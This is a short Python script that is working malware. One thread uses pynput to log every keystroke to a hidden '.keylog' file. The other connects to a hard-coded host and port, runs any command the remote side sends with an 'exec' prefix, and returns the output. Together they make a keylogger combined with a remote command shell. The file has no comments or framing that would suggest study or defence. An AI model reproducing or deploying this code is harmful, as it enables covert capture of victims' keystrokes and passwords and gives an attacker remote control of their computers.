from pynput.keyboard import Key, Listener
import socket, subprocess, threading

def start_keylogging():
    def on_press(key):
        f = open(".keylog", "a")
        if str(key).split(".")[0] == "Key":
            f.write("\n" + str(key).split(".")[1] + "\n")
        else:
            f.write(str(key))

    with Listener(on_press = on_press, on_release = None) as listener:
        listener.join()

def start_client():
    HOST = "192.168.24.5"
    PORT = 20030

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))
    while True:
        data = s.recv(1024)
        if data.decode() == "":
            break
        c = data.decode().split()
        if c[0] == "exec":
            process = subprocess.Popen(c[1:], stdout = subprocess.PIPE)
            output, error = process.communicate()
            if output:
                s.send(output)
            else:
                s.send(b"OK")
        else:
            s.send(b"OK")

        print(data)

if __name__ == "__main__":
    t1 = threading.Thread(target = start_keylogging)
    t2 = threading.Thread(target = start_client)

    t1.start()
    t2.start()

    t1.join()
    t2.join()